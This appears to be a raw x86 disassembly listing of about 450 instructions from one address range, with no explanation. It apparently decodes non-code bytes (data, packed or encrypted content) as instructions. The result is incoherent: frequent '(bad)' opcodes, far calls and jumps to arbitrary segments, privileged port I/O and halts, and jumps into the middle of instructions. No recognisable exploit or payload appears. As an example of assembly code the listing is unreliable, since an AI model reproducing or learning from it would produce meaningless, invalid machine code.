  44ae38:	ret    0xe732
  44ae3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ae3c:	xchg   edx,eax
  44ae3d:	sbb    cl,0xaf
  44ae40:	mov    dl,0x8a
  44ae42:	pop    eax
  44ae43:	call   0x4e0:0xbbbd57c0
  44ae4a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ae4c:	dec    ebp
  44ae4d:	fstp   TBYTE PTR [edx-0x70]
  44ae50:	jbe    0x44ae0e
  44ae52:	add    ch,cl
  44ae54:	mov    dl,0xe2
  44ae56:	dec    esi
  44ae57:	mul    ah
  44ae59:	jns    0x44ae23
  44ae5b:	pop    ebx
  44ae5c:	pop    edx
  44ae5d:	or     BYTE PTR [ebp-0x32fd8adc],dl
  44ae63:	jge    0x44aedf
  44ae65:	add    ebp,DWORD PTR [esi]
  44ae67:	jl     0x44ae1e
  44ae69:	xchg   esp,eax
  44ae6a:	scas   al,BYTE PTR es:[edi]
  44ae6b:	sub    eax,0x2b3afc9b
  44ae70:	stc    
  44ae71:	pop    es
  44ae72:	sub    ah,BYTE PTR [eax-0x45b77ce]
  44ae78:	out    0xfb,eax
  44ae7a:	dec    ebx
  44ae7b:	clc    
  44ae7c:	es int 0x9a
  44ae7f:	cmp    esi,esi
  44ae81:	xchg   edx,eax
  44ae82:	mov    dl,BYTE PTR [eax-0x5988f890]
  44ae88:	mov    dh,0x5b
  44ae8a:	das    
  44ae8b:	add    esi,DWORD PTR [ebx+0x4b]
  44ae8e:	retf   
  44ae8f:	xchg   esi,eax
  44ae90:	and    dl,dl
  44ae92:	add    BYTE PTR [ebx-0x62],dl
  44ae95:	adc    eax,0xfbb39f9a
  44ae9a:	sub    eax,0x6e63b9d7
  44ae9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aea0:	mov    edx,0xf337791b
  44aea5:	dec    edi
  44aea6:	adc    DWORD PTR [edx+esi*4],0x57
  44aeaa:	lods   al,BYTE PTR ds:[esi]
  44aeab:	add    edi,DWORD PTR [eax+0x372d8254]
  44aeb1:	or     bh,BYTE PTR [eax+0xeb00393]
  44aeb7:	xor    DWORD PTR [edx],0xffffffe3
  44aeba:	cmp    bl,BYTE PTR [ebp-0x4a]
  44aebd:	into   
  44aebe:	ficom  DWORD PTR [edi-0xc]
  44aec1:	sub    BYTE PTR [edx+0x50],bl
  44aec4:	mov    ah,0x2
  44aec6:	aas    
  44aec7:	pop    ss
  44aec8:	mov    dh,0x57
  44aeca:	jmp    0x8087:0x9a838bed
  44aed1:	xor    bh,BYTE PTR [eax-0x22]
  44aed4:	stos   BYTE PTR es:[edi],al
  44aed5:	sahf   
  44aed6:	xchg   esp,eax
  44aed7:	mov    ebx,0xc7aacb29
  44aedc:	sbb    al,0x1f
  44aede:	xchg   edx,eax
  44aedf:	inc    edi
  44aee0:	cmp    edi,0x9332a436
  44aee6:	xchg   DWORD PTR [ebp-0x40],edx
  44aee9:	leave  
  44aeea:	inc    edx
  44aeeb:	test   DWORD PTR [esi-0x6b76a1f3],0xcae05ab5
  44aef5:	push   0x9bf2a705
  44aefa:	stos   DWORD PTR es:[edi],eax
  44aefb:	iret   
  44aefc:	jb     0x44af1b
  44aefe:	fwait
  44aeff:	std    
  44af00:	mov    dl,0x13
  44af02:	xchg   ch,cl
  44af04:	rcr    BYTE PTR [esi-0x62],1
  44af07:	test   al,0x92
  44af09:	adc    al,0xbb
  44af0b:	(bad)  
  44af0c:	in     al,0x8b
  44af0e:	mov    ds:0x1dd3018d,al
  44af13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44af14:	push   esi
  44af15:	or     esi,esp
  44af17:	dec    edi
  44af18:	mov    dl,0x3
  44af1a:	jle    0x44aecf
  44af1c:	and    cl,BYTE PTR [edi]
  44af1e:	leave  
  44af1f:	lock in al,0x35
  44af22:	mov    eax,0xc7ebb2f2
  44af27:	stos   DWORD PTR es:[edi],eax
  44af28:	xor    esp,esi
  44af2a:	(bad)  
  44af2b:	mov    ah,0xb2
  44af2d:	xchg   DWORD PTR [edi],edx
  44af2f:	xchg   edi,eax
  44af30:	pop    es
  44af31:	dec    eax
  44af32:	xchg   edi,eax
  44af33:	sub    al,0xf4
  44af35:	jno    0x44af9d
  44af37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44af38:	xor    ebx,ecx
  44af3a:	sahf   
  44af3b:	mov    edx,0x7927b778
  44af40:	mov    ch,0x94
  44af42:	int3   
  44af43:	scas   eax,DWORD PTR es:[edi]
  44af44:	and    BYTE PTR [ebp-0x65],bh
  44af47:	cmp    al,0x40
  44af49:	xchg   BYTE PTR [esi-0x78],dh
  44af4c:	lods   eax,DWORD PTR ds:[esi]
  44af4d:	or     ebx,DWORD PTR [edi-0x6b]
  44af50:	pop    ds
  44af51:	mov    al,ds:0x8822a5ba
  44af56:	popf   
  44af57:	fsub   QWORD PTR [ecx-0x6d2c64bd]
  44af5d:	test   cl,ch
  44af5f:	jecxz  0x44af98
  44af61:	or     ebp,DWORD PTR [ebx+edi*2-0x44]
  44af65:	mov    dl,0xf7
  44af67:	test   BYTE PTR [ecx],dh
  44af69:	dec    ebp
  44af6a:	pop    es
  44af6b:	neg    DWORD PTR [esi]
  44af6d:	add    BYTE PTR [edx],al
  44af6f:	xor    ebp,edx
  44af71:	clc    
  44af72:	sbb    eax,0x815b7aae
  44af77:	sub    DWORD PTR [ebx-0x221e65dc],esi
  44af7d:	setl   BYTE PTR [edi]
  44af80:	arpl   bp,si
  44af82:	mov    al,gs:0xf68615d3
  44af88:	pop    edx
  44af89:	fisttp DWORD PTR [esi]
  44af8b:	js     0x44afaf
  44af8d:	or     bl,BYTE PTR [edx-0x49bac699]
  44af93:	cs aas 
  44af95:	imul   esi,DWORD PTR [ecx-0x259e0659],0xcb42b9c1
  44af9f:	inc    ebp
  44afa0:	adc    dh,BYTE PTR [ecx-0x7d4d7953]
  44afa6:	pop    ds
  44afa7:	(bad)  
  44afa8:	xchg   ebp,eax
  44afa9:	push   es
  44afaa:	int3   
  44afab:	dec    edi
  44afac:	inc    esp
  44afad:	or     ch,BYTE PTR [edi+0x27793aae]
  44afb3:	mov    edx,0xa85af3b5
  44afb8:	mov    dl,0x3d
  44afba:	push   cs
  44afbb:	data16 jp 0x44afe1
  44afbe:	ficom  DWORD PTR [esi]
  44afc0:	mov    esi,0xbaa5cf0b
  44afc5:	pop    eax
  44afc6:	cmp    eax,0x993f20ea
  44afcb:	jae    0x44b026
  44afcd:	call   DWORD PTR [ebx-0x714bb5c]
  44afd3:	test   BYTE PTR [eax-0x415e22f7],0x65
  44afda:	out    dx,al
  44afdb:	mov    ds:0xd6a0bcd,al
  44afe0:	test   al,0x4d
  44afe2:	push   edi
  44afe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44afe4:	aas    
  44afe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44afe6:	xchg   edi,eax
  44afe7:	ins    DWORD PTR es:[edi],dx
  44afe8:	idiv   BYTE PTR [esi+0x10]
  44afeb:	ss out dx,al
  44afed:	xor    DWORD PTR [edi],eax
  44afef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aff0:	lahf   
  44aff1:	cld    
  44aff2:	pop    ebx
  44aff3:	lock mov WORD PTR [ebx+0x59bba7ee],cs
  44affa:	sbb    eax,DWORD PTR [esi+0x52]
  44affd:	(bad)  
  44afff:	div    BYTE PTR [edi-0x4adde8ee]
  44b005:	cmp    bl,BYTE PTR [edx+0x40]
  44b008:	mov    esp,0x129c8534
  44b00d:	sbb    BYTE PTR [ecx],0xeb
  44b010:	xchg   esp,eax
  44b011:	push   ss
  44b012:	or     ah,BYTE PTR [edx-0x6366fc95]
  44b018:	inc    edx
  44b019:	in     eax,dx
  44b01a:	enter  0x8da6,0xd9
  44b01e:	popa   
  44b01f:	lods   eax,DWORD PTR ds:[esi]
  44b020:	sub    BYTE PTR [ebp-0x4bcd3764],bl
  44b026:	mov    dl,0x22
  44b028:	sbb    DWORD PTR [ebx],ecx
  44b02a:	xchg   BYTE PTR [ecx],ah
  44b02c:	jb     0x44b091
  44b02e:	rcl    BYTE PTR [esi+0x4c981aba],cl
  44b034:	jecxz  0x44b03d
  44b036:	fcom   DWORD PTR [eax-0x18a23494]
  44b03c:	(bad)  
  44b03d:	sub    eax,0x1627ebd9
  44b042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b043:	addr16 mov bl,0xfa
  44b046:	cdq    
  44b047:	push   eax
  44b048:	je     0x44b057
  44b04a:	call   0x168c:0xa3e0de4e
  44b051:	adc    BYTE PTR [ecx-0x37d1654d],0x1f
  44b058:	mov    cl,0xdb
  44b05a:	sub    DWORD PTR [ebx+0x4320c40],esi
  44b060:	in     eax,0xe8
  44b062:	call   0x4d63:0x5312fb90
  44b069:	mov    esi,0x96bda013
  44b06e:	cmp    al,0x9c
  44b070:	adc    BYTE PTR [ebx],cl
  44b072:	fsubr  QWORD PTR [ebx-0x564334f]
  44b078:	in     al,dx
  44b079:	push   esp
  44b07a:	rcr    DWORD PTR [edx+0x4b665e71],0x6b
  44b081:	or     cl,BYTE PTR [eax+0x72b0fc5b]
  44b087:	mov    dh,0xb1
  44b089:	repz sbb ecx,DWORD PTR [ebx+esi*4+0xd]
  44b08e:	(bad)  
  44b08f:	out    0x8d,al
  44b091:	jmp    0x44b0e9
  44b093:	test   eax,0xa751025e
  44b098:	jecxz  0x44b08e
  44b09a:	or     DWORD PTR [edi+0x37df821b],esi
  44b0a0:	mov    dl,0xb7
  44b0a2:	(bad)  
  44b0a3:	icebp  
  44b0a4:	outs   dx,DWORD PTR ds:[esi]
  44b0a5:	and    esp,esp
  44b0a7:	ror    BYTE PTR fs:[edi],0x49
  44b0ab:	dec    DWORD PTR [ecx-0x44]
  44b0ae:	in     al,dx
  44b0af:	daa    
  44b0b0:	jae    0x44b131
  44b0b2:	mov    ebp,?
  44b0b4:	dec    ebp
  44b0b5:	repnz xor bl,BYTE PTR [ebx+0xd]
  44b0b9:	cmp    DWORD PTR [edx-0x56b0b12e],ebx
  44b0bf:	xchg   DWORD PTR [ecx],ebx
  44b0c1:	push   ecx
  44b0c2:	sbb    DWORD PTR [edi+0x4c9e1670],esp
  44b0c8:	push   esi
  44b0c9:	push   ebx
  44b0ca:	pop    esp
  44b0cb:	or     esi,DWORD PTR [edx+0x77c1ef0d]
  44b0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b0d2:	push   ebx
  44b0d3:	mov    ecx,0xfdc80b53
  44b0d8:	dec    edx
  44b0d9:	and    al,0x96
  44b0db:	fisubr DWORD PTR [esi]
  44b0dd:	dec    esp
  44b0de:	call   0x719c:0x5b543269
  44b0e5:	jg     0x44b0aa
  44b0e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b0e8:	inc    esi
  44b0e9:	jl     0x44b08d
  44b0eb:	xor    eax,0xa4c81555
  44b0f0:	mov    dl,0xf8
  44b0f2:	fidiv  DWORD PTR [ecx+ebx*4-0x2d]
  44b0f6:	adc    edi,edx
  44b0f8:	dec    edx
  44b0f9:	or     esp,edx
  44b0fb:	or     bl,BYTE PTR [edi-0x6]
  44b0fe:	inc    eax
  44b0ff:	jno    0x44b0fc
  44b101:	imul   ebp,DWORD PTR [edx],0xeac3b3fb
  44b107:	dec    ebp
  44b108:	mov    edx,0x4e55c19b
  44b10d:	sbb    ah,bh
  44b10f:	sahf   
  44b110:	jne    0x44b160
  44b112:	popf   
  44b113:	pushf  
  44b114:	aad    0xa6
  44b116:	sbb    DWORD PTR [esi+0x6f8a74cf],esi
  44b11c:	mov    dh,0x64
  44b11e:	call   0xadc:0x1ebfaca4
  44b125:	mov    bh,0xa5
  44b127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b128:	xor    ebp,esp
  44b12a:	xor    eax,0x59339da8
  44b12f:	data16 mov dl,0xe3
  44b132:	xchg   esi,eax
  44b133:	fmul   DWORD PTR [eax-0x48451007]
  44b139:	das    
  44b13a:	adc    edx,esp
  44b13c:	inc    esp
  44b13d:	or     ebx,DWORD PTR [ebp+0x4829adee]
  44b143:	dec    esp
  44b144:	mov    ch,0xbc
  44b146:	push   cs
  44b147:	shl    DWORD PTR [eax],1
  44b149:	js     0x44b175
  44b14b:	data16 aam 0x9e
  44b14e:	xlat   BYTE PTR ds:[ebx]
  44b14f:	pop    ebx
  44b150:	jp     0x44b14f
  44b152:	xchg   esi,eax
  44b153:	aad    0xe9
  44b155:	std    
  44b156:	cdq    
  44b157:	scas   al,BYTE PTR es:[edi]
  44b158:	jo     0x44b0e3
  44b15a:	xchg   edx,eax
  44b15b:	lea    esi,[esi-0x179a4699]
  44b161:	pop    ebp
  44b162:	sbb    dl,BYTE PTR [eax+ebx*1+0x48]
  44b166:	or     dx,0xffe3
  44b16a:	call   0x8c04:0x1c1deedf
  44b171:	cdq    
  44b172:	push   ebx
  44b173:	test   eax,0xd3a653d2
  44b178:	rol    BYTE PTR [ecx],cl
  44b17a:	xchg   ecx,eax
  44b17b:	cs dec esp
  44b17d:	or     dl,BYTE PTR [ecx-0x621f1d69]
  44b183:	sub    BYTE PTR [esi*1+0x44af29b],dh
  44b18a:	sub    eax,0xf8d7f2e1
  44b18f:	or     eax,0xfef51af
  44b194:	xchg   DWORD PTR [ebx],ecx
  44b196:	ret    
  44b197:	xchg   ebp,eax
  44b198:	xor    eax,0xc80a1e49
  44b19d:	or     esi,esi
  44b19f:	dec    ebx
  44b1a0:	push   edi
  44b1a2:	pop    ebp
  44b1a3:	out    0xec,eax
  44b1a5:	sbb    DWORD PTR [edx+0x6c0b8462],esp
  44b1ab:	pop    edi
  44b1ac:	mov    esp,eax
  44b1ae:	out    0x93,eax
  44b1b0:	inc    eax
  44b1b1:	push   ss
  44b1b2:	pushf  
  44b1b3:	sti    
  44b1b4:	hlt    
  44b1b5:	das    
  44b1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b1b7:	xchg   edi,eax
  44b1b8:	out    dx,al
  44b1b9:	div    DWORD PTR [esi-0x2fd44db1]
  44b1bf:	ror    DWORD PTR [eax-0xb],cl
  44b1c2:	pushf  
  44b1c3:	outs   dx,DWORD PTR ds:[esi]
  44b1c4:	cmp    BYTE PTR [ebx],cl
  44b1c6:	dec    ebp
  44b1c7:	shr    BYTE PTR [esi+0x709da121],cl
  44b1cd:	das    
  44b1ce:	xchg   esp,eax
  44b1cf:	stos   BYTE PTR es:[edi],al
  44b1d0:	lods   eax,DWORD PTR ds:[esi]
  44b1d1:	xchg   edi,eax
  44b1d2:	xchg   edx,eax
  44b1d3:	addr16 jb 0x44b1f1
  44b1d6:	sbb    al,0x63
  44b1d8:	ficomp DWORD PTR [esp+eax*4]
  44b1db:	mov    eax,ds:0x693105b3
  44b1e0:	xchg   edx,eax
  44b1e1:	pmulhuw mm3,QWORD PTR [esi]
  44b1e4:	xor    BYTE PTR [edx-0x62],cl
  44b1e7:	dec    esp
  44b1e8:	jp     0x44b23f
  44b1ea:	ret    
  44b1eb:	out    dx,eax
  44b1ec:	sbb    eax,0xc6bcc0cb
  44b1f1:	ds call 0x1962:0xaaa1989c
  44b1f9:	add    ebp,DWORD PTR [ebp-0x5a]
  44b1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b1fd:	lods   eax,DWORD PTR ds:[esi]
  44b1fe:	test   esi,eax
  44b200:	pop    ebx
  44b201:	jae    0x44b26a
  44b203:	outs   dx,DWORD PTR ds:[esi]
  44b204:	and    eax,0xe3b09a11
  44b209:	test   DWORD PTR [eax],edx
  44b20b:	sahf   
  44b20c:	in     al,dx
  44b20d:	or     bl,BYTE PTR [eax-0x5a]
  44b210:	xor    edi,esp
  44b212:	cwde   
  44b213:	ror    DWORD PTR [esi+0x7d],0x88
  44b217:	xchg   DWORD PTR [edx+0x5b],eax
  44b21a:	call   0x3cfe:0xa2d154f
  44b221:	daa    
  44b222:	xchg   BYTE PTR [edi-0xf76cb05],ah
  44b228:	out    0xed,eax
  44b22a:	jnp    0x44b22f
  44b22c:	sahf   
  44b22d:	arpl   WORD PTR [edi+0x49],di
  44b230:	mov    dl,0x1c
  44b232:	ins    DWORD PTR es:[edi],dx
  44b233:	dec    eax
  44b234:	sbb    ebp,DWORD PTR [ebx+eiz*1]
  44b237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b238:	loop   0x44b20f
  44b23a:	fsubr  DWORD PTR [edx-0xf]
  44b23d:	xor    BYTE PTR [edi-0x49],0xb2
  44b241:	popf   
  44b242:	out    dx,al
  44b243:	jmp    0xbac:0x21e9eb7b
  44b24a:	out    0x8f,eax
  44b24c:	sahf   
  44b24d:	inc    eax
  44b24e:	xchg   edx,eax
  44b24f:	pop    edi
  44b250:	cs retf 0xe59a
  44b254:	dec    ebx
  44b255:	or     DWORD PTR [ecx+0x2],ebp
  44b258:	jb     0x44b280
  44b25a:	sbb    DWORD PTR [edi+0x58fef053],esp
  44b260:	leave  
  44b261:	pop    ebx
  44b262:	sahf   
  44b263:	mov    cl,0xa4
  44b265:	icebp  
  44b266:	push   ebp
  44b267:	add    esi,DWORD PTR [edx-0x5241b435]
  44b26d:	mov    al,ds:0x8d78a78a
  44b272:	xor    ch,bh
  44b274:	jl     0x44b23c
  44b276:	cli    
  44b277:	pushf  
  44b278:	scas   al,BYTE PTR es:[edi]
  44b279:	cmp    DWORD PTR [ecx],edi
  44b27b:	call   0x1e71:0x463c437d
  44b282:	out    dx,eax
  44b283:	add    eax,0xac79a376
  44b288:	aaa    
  44b289:	pop    ecx
  44b28a:	mov    dl,0x3b
  44b28c:	mov    dl,0x95
  44b28e:	frstor [ebp-0x4a580444]
  44b294:	jecxz  0x44b221
  44b296:	int3   
  44b297:	nop
  44b298:	and    esp,DWORD PTR [edx]
  44b29a:	sub    DWORD PTR ds:0xad8f0b64,0x3b
  44b2a1:	mov    al,0x25
  44b2a3:	(bad)
  44b2a6:	call   0x99ef:0xf45b9444
  44b2ad:	jae    0x44b301
  44b2af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b2b0:	loopne 0x44b2ef
  44b2b2:	sub    BYTE PTR ds:0x54ba6eec,al
  44b2b8:	mov    dl,0x2f
  44b2ba:	out    0xa3,al
  44b2bc:	sar    BYTE PTR [esi],cl
  44b2be:	push   eax
  44b2bf:	mov    esi,0xef4a0a09
  44b2c4:	cmp    DWORD PTR ds:0x9795f56e,eax
  44b2ca:	jp     0x44b33e
  44b2cc:	jge    0x44b291
  44b2ce:	xor    al,bh
  44b2d0:	aam    0x24
  44b2d2:	pop    ebp
  44b2d3:	imul   BYTE PTR [eax+ecx*1-0x184bca99]
  44b2da:	pop    edx
  44b2db:	push   cs
  44b2dc:	inc    edx
  44b2dd:	dec    ebx
  44b2de:	out    dx,al
  44b2df:	inc    esp
  44b2e0:	mov    dl,0x2e
  44b2e2:	das    
  44b2e3:	sbb    al,0xf4
  44b2e5:	mov    ds:0xb318e88,eax
  44b2ea:	(bad)  
  44b2eb:	cwde   
  44b2ec:	test   BYTE PTR [esp+ebp*2-0x65704b86],al
  44b2f3:	dec    esp
  44b2f4:	js     0x44b347
  44b2f6:	dec    esp
  44b2f7:	mov    esp,0xa5601422
  44b2fc:	mov    DWORD PTR [esi-0x7e],esi
  44b2ff:	sar    BYTE PTR [edx+esi*8-0x2e5cd606],cl
  44b306:	call   0xb760:0x114bfd41
  44b30d:	sbb    DWORD PTR [eax+0x124d9a9],ebp
  44b313:	inc    edi
  44b314:	repnz and BYTE PTR [ebx+edi*1+0x17],dh
  44b319:	inc    edx
  44b31a:	data16 stc 
  44b31c:	mov    dl,BYTE PTR ds:0x6827e8
  44b322:	mov    bh,0xe7
  44b324:	out    dx,eax
  44b325:	add    edi,DWORD PTR [esi]
  44b327:	dec    esp
  44b328:	imul   ebx,DWORD PTR [edi-0x648756ba],0x38
  44b32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b330:	(bad)  
  44b331:	push   ebp
  44b332:	sub    edi,DWORD PTR [esi*8-0x4d05e1f9]
  44b339:	fstp   DWORD PTR [eax]
  44b33b:	sahf   
  44b33c:	rcl    BYTE PTR [edi+0x14],1
  44b33f:	adc    DWORD PTR [ebx],edx
  44b341:	or     ebx,DWORD PTR [ebx+edx*8-0x50dcf76a]
  44b348:	inc    esi
  44b349:	inc    edi
  44b34a:	cli    
  44b34b:	in     al,0x68
  44b34d:	inc    ebp
  44b34e:	xchg   esi,eax
  44b34f:	add    DWORD PTR [ebx+ecx*1+0x19],edi
  44b353:	fldenv [edx-0x6c659a72]
  44b359:	jo     0x44b2f6
  44b35b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b35c:	loop   0x44b3ba
  44b35e:	retf   
  44b35f:	hlt    
  44b360:	pop    edx
  44b361:	adc    al,0x72
  44b363:	mov    ecx,0x838132fa
  44b368:	and    BYTE PTR [ebx-0x5d9b580c],al
  44b36e:	sahf   
  44b36f:	mov    bl,0x59
  44b371:	into   
  44b372:	rol    BYTE PTR [eax+0x48],cl
  44b375:	xor    dh,bh
  44b377:	and    ah,al
  44b379:	imul   esi,DWORD PTR [esp+edx*1+0x608bef92],0xe29e0ba8
  44b384:	mov    esi,0x3121982
  44b389:	mov    ecx,0xa5a27786
  44b38e:	sbb    dl,BYTE PTR [ecx-0xc]
  44b391:	jmp    0xb6635a7
  44b396:	jne    0x44b3c6
  44b398:	cld    
  44b399:	or     al,0xda
  44b39b:	stos   DWORD PTR es:[edi],eax
  44b39c:	xchg   ecx,ebx
  44b39e:	pop    ebx
  44b39f:	mov    DWORD PTR [eax+0x79],ecx
  44b3a2:	ret    
  44b3a3:	mov    edx,edx
  44b3a5:	sahf   
  44b3a6:	stos   BYTE PTR es:[edi],al
  44b3a7:	test   eax,0x4c4045ae
  44b3ac:	rcr    DWORD PTR [edx],cl
  44b3ae:	stc    
  44b3af:	mov    bh,0x91
  44b3b1:	shl    DWORD PTR [edi],cl
  44b3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b3b4:	(bad)
  44b3b8:	mov    cl,0x4
  44b3ba:	iret   
  44b3bb:	mov    bl,0x37
  44b3bd:	(bad)  
  44b3bf:	jg     0x44b3dd
  44b3c1:	fst    QWORD PTR [esi-0x48]
  44b3c4:	inc    esp
  44b3c5:	push   es
  44b3c6:	push   0x936575a6
  44b3cb:	sub    eax,0xb322ef41
  44b3d0:	mov    dl,0x7f
  44b3d2:	fdivrp st(5),st
  44b3d4:	int    0x82
  44b3d6:	xor    esp,DWORD PTR [ebx-0x69]
  44b3d9:	je     0x44b398
  44b3db:	pusha  
  44b3dc:	mov    ah,0x28
  44b3de:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b3e0:	pop    ecx
  44b3e1:	add    eax,0xbbbcea11
  44b3e6:	dec    esp
  44b3e7:	cli    
  44b3e8:	repz imul esp,DWORD PTR [esi-0x34ccb53f],0xffffffb4
  44b3f0:	repnz shr BYTE PTR [eax-0x3fd23459],0xcf
  44b3f8:	sub    ah,BYTE PTR [edi-0x73]
  44b3fb:	int3   
  44b3fc:	fld    QWORD PTR [esi-0x7b]
  44b3ff:	xchg   ebp,eax
  44b400:	mov    dl,0x9
  44b402:	clc    
  44b403:	repz jp 0x44b3b6
  44b406:	jno    0x44b3af
  44b408:	push   ds
  44b409:	test   eax,0x602e9207
  44b40e:	push   cs
  44b40f:	and    esi,DWORD PTR [edx-0x220f99b2]
  44b415:	mov    esi,0xb986769
  44b41a:	stos   BYTE PTR es:[edi],al
  44b41b:	mov    WORD PTR [ebx+0x66],es
  44b41e:	adc    esi,DWORD PTR [edi+0x5a]
  44b421:	and    bl,BYTE PTR [edx-0x5ee8494b]
  44b427:	jmp    0xea0:0x3ffc8bbe
  44b42e:	imul   ecx,DWORD PTR [eax],0x27f1ad84
  44b434:	in     al,dx
  44b435:	jg     0x44b42e
  44b437:	adc    eax,0x873b11bd
  44b43c:	scas   al,BYTE PTR es:[edi]
  44b43d:	sub    ebx,edi
  44b43f:	and    eax,0xa4a64b0b
  44b444:	mov    ds:0x3fa68e43,al
  44b449:	ja     0x44b44d
  44b44b:	mov    edi,0x809acc31
  44b450:	pop    edx
  44b451:	les    ebx,FWORD PTR [ebx-0x1]
  44b454:	pop    ebx
  44b455:	imul   esp,DWORD PTR [ebx-0x346dac59],0x2a
  44b45c:	les    ebx,FWORD PTR [ebx-0x9]
  44b45f:	sub    ah,cl
  44b461:	cdq    
  44b462:	xchg   BYTE PTR [ebp+0x2d9a1549],bl
  44b468:	mov    ch,0xa3
  44b46a:	cmp    dl,BYTE PTR [ecx-0x4a]
  44b46d:	xchg   ebx,eax
  44b46e:	out    dx,eax
  44b46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b470:	cmp    bh,bl
  44b472:	ret    
  44b473:	add    eax,0x9c5a23af
  44b478:	rcr    BYTE PTR [eax-0x66],0x15
  44b47c:	cli    
  44b47d:	outs   dx,BYTE PTR ds:[esi]
  44b47e:	pop    esi
  44b47f:	and    ah,ah
  44b481:	pop    ecx
  44b482:	xchg   edi,eax
  44b483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b484:	jg     0x44b4f7
  44b486:	xchg   ecx,eax
  44b487:	test   DWORD PTR [edx-0x54],edi
  44b48a:	jns    0x44b437
  44b48c:	dec    edx
  44b48d:	cs test eax,0xb4f6b2f4
  44b493:	or     BYTE PTR [ebx+0x57edaec4],dl
  44b499:	jnp    0x44b47c
  44b49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b49c:	add    BYTE PTR [esi+0x26632722],al
  44b4a2:	xor    DWORD PTR [ebx],ebx
  44b4a4:	mov    dl,0x80
  44b4a6:	nop
  44b4a7:	icebp  
  44b4a8:	xchg   BYTE PTR [edx+0xa6c018d],al
  44b4ae:	add    ebp,edi
  44b4b0:	out    dx,eax
  44b4b1:	call   0x257f8c91
  44b4b6:	call   0xdda4:0xee6a882c
  44b4bd:	or     al,0xf4
  44b4bf:	xchg   edi,edx
  44b4c1:	jns    0x44b4d8
  44b4c3:	repnz into 
  44b4c5:	or     al,0xf
  44b4c7:	imul   ecx,DWORD PTR [ecx-0x55],0xbc4dd211
  44b4ce:	lahf   
  44b4cf:	mov    DWORD PTR [ebx+0x72c2f25f],esi
  44b4d5:	sub    eax,0xbd1d1a6
  44b4da:	in     eax,0xc3
  44b4dc:	pop    edi
  44b4dd:	xchg   BYTE PTR [esi-0x65c13e7e],cl
  44b4e3:	inc    edx
  44b4e4:	fdivp  st(0),st
  44b4e6:	push   ecx
  44b4e7:	leave  
  44b4e8:	add    DWORD PTR [edi+0x70],edi
  44b4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b4ec:	rol    BYTE PTR [eax*8+0x643dd3d1],1
  44b4f3:	into   
  44b4f4:	mov    dl,0xd6
  44b4f6:	(bad)  
  44b4f7:	push   esi
  44b4f8:	loope  0x44b549
  44b4fa:	(bad)  
  44b4fb:	pusha  
  44b4fc:	lock add al,0xdd
  44b4ff:	xchg   edx,eax
  44b500:	aam    0x89
  44b502:	cli    
  44b503:	mov    eax,DWORD PTR [ebp-0x4e780996]
  44b509:	jno    0x44b4b4
  44b50b:	lock and DWORD PTR cs:[eax-0x6d303f9],ecx
  44b513:	(bad)  
  44b514:	and    eax,0xc79d2490
  44b519:	js     0x44b535
  44b51b:	mov    ebx,0xea873981
  44b520:	push   cs
  44b521:	jb     0x44b4af
  44b523:	call   0x73dd:0x9a9a6cd3
  44b52a:	(bad)  [eax+0x282016c5]
  44b530:	or     ebx,0xffffffee
  44b533:	shr    DWORD PTR [ecx],0x1f
  44b536:	icebp  
  44b537:	lahf   
  44b538:	mov    cl,0xcc
  44b53a:	lods   al,BYTE PTR ds:[esi]
  44b53b:	retf   
  44b53c:	lea    ecx,[esi]
  44b53e:	fisttp WORD PTR [ebx+ebx*8-0x5]
  44b542:	retf   0x1681
  44b545:	add    dh,dl
  44b547:	inc    edi
  44b548:	icebp  
  44b549:	sar    DWORD PTR [edx],cl
  44b54b:	or     eax,0xc3f437d3
  44b550:	leave  
  44b551:	jne    0x44b4ed
  44b553:	call   0xffb03120
  44b558:	stos   BYTE PTR es:[edi],al
  44b559:	dec    esp
  44b55a:	fs ffreep st(6)
  44b55d:	add    eax,0x677606d7
  44b562:	sbb    BYTE PTR [ebx+0x23ce7731],bh
  44b568:	xor    al,0xf6
  44b56a:	add    BYTE PTR [edi],0xcc
  44b56d:	or     edx,DWORD PTR [esp+eax*8]
  44b570:	sbb    edi,DWORD PTR [eax+eax*1]
  44b573:	mov    dl,0xc4
  44b575:	cwde   
  44b576:	out    dx,eax
  44b577:	xchg   ebp,eax
  44b578:	lods   eax,DWORD PTR ds:[esi]
  44b579:	add    bl,BYTE PTR [eax]
  44b57b:	xor    edx,0x41
  44b57e:	xor    DWORD PTR [eax+ecx*2],eax
  44b581:	pop    ss
  44b582:	fwait
  44b583:	test   al,0xd4
  44b585:	mov    ds:0x714f7274,ax
  44b58b:	idiv   DWORD PTR [ebx]
  44b58d:	aaa    
  44b58e:	call   0x86dd:0xaa92fab5
  44b595:	inc    edx
  44b596:	push   es
  44b597:	fdiv   DWORD PTR [edx+ecx*1+0x3f]
  44b59b:	mov    esi,0xd09b8e33
  44b5a0:	fmulp  st(3),st
  44b5a2:	cli    
  44b5a3:	sub    al,0x2a
  44b5a5:	cmp    bh,BYTE PTR [ecx+0x76]
  44b5a8:	into   
  44b5a9:	(bad)  [edx+0x1ab9b25b]
